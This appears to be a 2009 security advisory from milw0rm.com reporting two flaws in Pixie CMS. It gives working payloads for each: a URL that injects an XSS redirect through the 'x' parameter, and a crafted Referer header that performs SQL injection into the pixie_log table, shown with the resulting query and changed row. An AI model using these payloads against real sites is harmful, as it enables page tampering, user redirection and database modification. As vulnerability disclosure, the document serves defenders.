@@ -1,0 +1,81 @@
+Pixie CMS Multiple Vulnerabilities
+
+Pixie is a "free, open source web application that will help you quickly
+create your own website.  Many people refer to this type of software as
+a 'content management system (cms)'" (http://www.getpixie.co.uk).  Pixie
+is written in PHP with a MySQL database back end.
+
+Pixie Blog XSS
+
+It is possible to trivially introduce a Cross Site Scripting (XSS)
+attack by tampering with blog post URL variables, specifically the "x="
+variable which is designed to contain blog posting titles.  For
+instance, on a default install of Pixie, the first blog post contains is
+referenced using the URL ?s=blog&m=permalink&x=my-first-post.  The "x"
+variable is interlaced with the BODY tag during display on line 150 of
+index.php:
+
+<body class="pixie <?php $s." "; $date_array = getdate(); print
+"y".$date_array['year']." "; print "m".$date_array['mon']." "; print
+"d".$date_array['mday']." "; print "h".$date_array['hours']." "; print
+$s; ?>">
+
+by changing the "x" variable it is possible to inject HTML code into the
+page display.  For instance, a Pixie blog post that was intended to be
+published as
+
+http://192.168.0.67/pixie/?s=blog&m=permalink&x=my-first-post
+
+Can be altered to the form:
+
+http://192.168.0.67/pixie/?s=blog&m=permalink&x="
+onLoad="location.href='http://lampsecurity.org'
+
+and redirect users to the "onLoad" specified URL.
+
+Pixie Blog SQL Injection
+
+Pixie blog is vulnerable to SQL injection by manipulating the "referer"
+client request.  Referers are tracked in the referral() function
+(/admin/lib/lib_logs.php line 31) but are not sanitized.  Thus,
+manipulating the referer can allow an attacker to perform SQL Injection
+attacks.  For example, sending the request:
+
+GET http://192.168.0.67/pixie/?s=events HTTP/1.1
+Host: 192.168.0.67
+User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.6)
+Gecko/2009020501 Firefox/3.0.6 Paros/3.2.13
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Proxy-Connection: keep-alive
+Referer: http://www.lampsecurity.org/pixie/?s=about',log_id=1 on
+duplicate key update log_message='foobar
+Cookie: bb2_screener_=1237492959+192.168.0.3
+
+Results in the pixie_log table being altered by issuing the following
+SQL statement:
+
+insert into pixie_log set user_id = 'Visitor', user_ip = '192.168.0.3',
+log_time = now(), log_type = 'referral', log_icon = 'referral',
+log_message = 'http://www.lampsecurity.org/pixie/?s=about',log_id=1 on
+duplicate key update log_message='foobar'
+
+resulting in:
+
+mysql> select * from pixie_log where log_id=1;
+
++--------+---------+-------------+---------------------+----------+-------------+----------+---------------+
+| log_id | user_id | user_ip     | log_time            | log_type |
+log_message | log_icon | log_important |
++--------+---------+-------------+---------------------+----------+-------------+----------+---------------+
+|      1 | Visitor | 192.168.0.3 | 2009-03-19 16:49:31 | system   |
+foobar      | error    | yes           |
++--------+---------+-------------+---------------------+----------+-------------+----------+---------------+
+1 row in set (0.00 sec)
+
+This vulnerability report is also published at
+http://lampsecurity.org/Pixie-CMS-Multiple-Vulnerabilities.
+
+# milw0rm.com [2009-03-20]
